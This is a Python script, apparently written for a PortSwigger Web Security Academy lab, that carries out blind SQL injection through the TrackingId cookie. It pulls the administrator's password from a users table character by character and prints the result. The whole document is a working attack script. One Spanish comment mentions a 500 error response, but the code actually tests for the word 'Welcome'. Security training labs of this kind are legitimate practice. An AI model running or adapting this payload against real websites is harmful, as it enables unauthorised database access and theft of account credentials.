import requests
import string
import urllib.parse
import urllib3


#PAYLOAD SQLI A BASE DE RESPUESTAS CONDICIONALES (EN ESTE CASO UN CODIGO 500)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a9100a6047eed7880c408880055007e.web-security-academy.net/' #URL
payload = "' and (select substring(password,{},1) from users where username='administrator')='{}'--"
characters = string.printable

password = ''

#RANGO DE LA CONTRASEÑA
for i in range(1, 21):
    for char in characters:
        cookie = {'TrackingId': 'irzeeWWkDElmn2Vx' + payload.format(i, char)}
        r = requests.get(url, cookies=cookie, verify=False)
        if "Welcome" in r.text:
            password += char
            break

print("[x] La contraseña es: {}".format(password))